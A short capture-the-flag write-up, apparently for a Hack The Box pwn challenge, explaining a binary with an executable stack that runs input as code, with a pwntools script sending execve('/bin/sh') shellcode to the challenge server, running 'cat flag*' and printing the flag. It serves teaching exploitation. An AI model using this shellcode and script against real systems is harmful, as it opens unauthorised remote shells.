# El Teteo

## Summary

NX disabled (executable stack), PIE + canary present but irrelevant. Program reads 31 bytes onto the stack and calls it as code — straight ret2shellcode.

## Solution

### Step 1: Send shellcode

The binary has a `GNU_STACK` segment with `RWE` permissions, so the stack is executable. `main` reads `0x1f` (31) bytes via `read()` into a stack buffer and calls it as a function pointer. Any `execve("/bin/sh")` shellcode ≤ 31 bytes works.

### Step 2: Get flag

```python
from pwn import *

context.arch = 'amd64'
p = remote('154.57.164.80', 30107)

sc = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

p.sendlineafter(b'> ', sc)
p.sendline(b'cat flag*')
flag = p.recvline_contains(b'HTB').strip().decode()
print(flag)
```

## Flag

```
HTB{3l_t3t30_d3_5h3llc0d3_0f_sk1d}
```
